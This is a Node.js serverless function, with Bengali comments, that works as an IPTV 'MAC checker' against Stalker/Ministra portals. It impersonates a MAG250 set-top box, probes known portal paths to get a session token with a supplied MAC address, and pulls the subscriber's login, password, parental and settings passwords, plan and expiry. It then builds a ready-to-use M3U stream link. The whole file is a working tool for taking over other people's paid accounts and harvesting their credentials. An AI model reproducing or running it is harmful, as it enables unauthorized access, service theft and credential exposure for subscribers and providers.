const axios = require('axios');

module.exports = async (req, res) => {
    // CORS & Method Check
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ message: 'Method Not Allowed' });

    const { host, mac } = req.body;
    if (!host || !mac) return res.status(400).json({ message: 'Missing Data' });

    // ১. পাইথন স্ক্রিপ্টের মতো কাস্টম পার্সার (String Splitter)
    // এটি JSON ফেইল করলেও টেক্সট থেকে ডাটা খুঁজে বের করবে
    const extract = (text, key) => {
        try {
            if (typeof text !== 'string') text = JSON.stringify(text);
            const parts = text.split(`"${key}":"`);
            if (parts.length > 1) {
                let val = parts[1].split('"')[0];
                return val.replace(/\\/g, ''); // ক্লিন করা
            }
        } catch (e) {}
        return null;
    };

    let baseUrl = host.endsWith('/') ? host.slice(0, -1) : host;
    
    // পাইথন স্ক্রিপ্ট থেকে নেওয়া সব পাথ
    const portalPaths = [
        '/portal.php',
        '/server/load.php',
        '/stalker_portal/server/load.php',
        '/c/portal.php',
        '/c/server/load.php',
        '/portalstb/portal.php',
        '/magportal/portal.php',
        '/ministra/portal.php'
    ];

    const headers = {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
        'Cookie': `mac=${mac}; stb_lang=en; timezone=Europe/Paris;`,
        'Accept': '*/*',
        'Referer': baseUrl,
        'Authorization': 'Bearer 123'
    };

    let workingPath = '';
    let token = '';
    let rawData = '';

    try {
        // ২. Handshake Loop (সঠিক পাথ খোঁজা)
        for (const path of portalPaths) {
            try {
                const targetUrl = `${baseUrl}${path}?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml`;
                const resHand = await axios.get(targetUrl, { headers, timeout: 3000 });
                
                // পাইথন স্টাইলে টোকেন খোঁজা
                let tempToken = extract(resHand.data, "token") || resHand.data?.js?.token;
                
                if (tempToken) {
                    workingPath = path;
                    token = tempToken;
                    break;
                }
            } catch (e) { continue; }
        }

        if (!token) {
            return res.json({ success: false, message: 'MAC Dead / Handshake Failed ❌' });
        }

        headers['Authorization'] = `Bearer ${token}`;

        // ৩. Get Profile (Text Mode)
        // আমরা সরাসরি টেক্সট রেসপন্স নিয়ে কাজ করব যাতে কোনো ডাটা মিস না হয়
        const profUrl = `${baseUrl}${workingPath}?type=stb&action=get_profile&JsHttpRequest=1-xml`;
        const profRes = await axios.get(profUrl, { headers, timeout: 5000 });
        rawData = JSON.stringify(profRes.data); // পুরো ডাটা স্ট্রিং এ কনভার্ট

        // ৪. পাইথন লজিক দিয়ে ডাটা বের করা
        // পাইথন কোডে: login, password, parent_password, tariff_plan_id ইত্যাদি বের করা হতো
        const dataMap = {
            expiry: extract(rawData, "phone") || extract(rawData, "end_date") || extract(rawData, "expire_billing_date") || 'Unlimited',
            created: extract(rawData, "created") || 'Unknown',
            username: extract(rawData, "login") || extract(rawData, "fname") || extract(rawData, "name") || 'N/A',
            password: extract(rawData, "password") || extract(rawData, "pass") || 'N/A',
            adult_pass: extract(rawData, "parent_password") || '0000',
            settings_pass: extract(rawData, "settings_password") || 'N/A',
            tariff_id: extract(rawData, "tariff_plan_id") || 'N/A',
            tariff_plan: extract(rawData, "tariff_plan") || extract(rawData, "package_name") || 'N/A',
            max_online: extract(rawData, "max_online") || '1', // ডিফল্ট ১
            stb_type: extract(rawData, "stb_type") || 'MAG250',
            country: extract(rawData, "country") || extract(rawData, "locale") || 'N/A',
            comment: extract(rawData, "comment") || 'No Comment'
        };

        // ৫. M3U লিংক জেনারেট
        // পাইথন স্ক্রিপ্টে m3u লিংকে ইউজারনেম/পাসওয়ার্ড হিসেবে ম্যাক ব্যবহার করা হয়েছে যদি লগিন না থাকে
        let m3uUser = dataMap.username !== 'N/A' ? dataMap.username : mac;
        let m3uPass = dataMap.password !== 'N/A' ? dataMap.password : mac;
        
        // কিছু পোর্টালে লগিন দিয়েই স্ট্রিম চলে, কিছু পোর্টালে ম্যাক লাগে
        // সেফটির জন্য আমরা ম্যাক-ভিত্তিক লিংক দিচ্ছি যা পাইথন স্ক্রিপ্টে ডিফল্ট ছিল
        const m3uLink = `${baseUrl}/get.php?username=${mac}&password=${mac}&type=m3u_plus&output=ts`;

        // ৬. ক্যাটাগরি স্ক্যান (অপশনাল)
        let live = [], vod = [];
        try {
            const liveRes = await axios.get(`${baseUrl}${workingPath}?type=itv&action=get_genres&JsHttpRequest=1-xml`, { headers, timeout: 3000 });
            if (liveRes.data?.js) live = liveRes.data.js.map(x => x.title).slice(0, 10);
        } catch (e) {}

        try {
            const vodRes = await axios.get(`${baseUrl}${workingPath}?type=vod&action=get_categories&JsHttpRequest=1-xml`, { headers, timeout: 3000 });
            if (vodRes.data?.js) vod = vodRes.data.js.map(x => x.title).slice(0, 10);
        } catch (e) {}

        return res.json({
            success: true,
            message: 'Active Account ✅',
            connected_path: workingPath,
            data: {
                mac: mac,
                ...dataMap,
                m3u: m3uLink,
                liveCategories: live,
                vodCategories: vod
            }
        });

    } catch (error) {
        return res.status(500).json({ success: false, message: 'Server Error', error: error.message });
    }
};
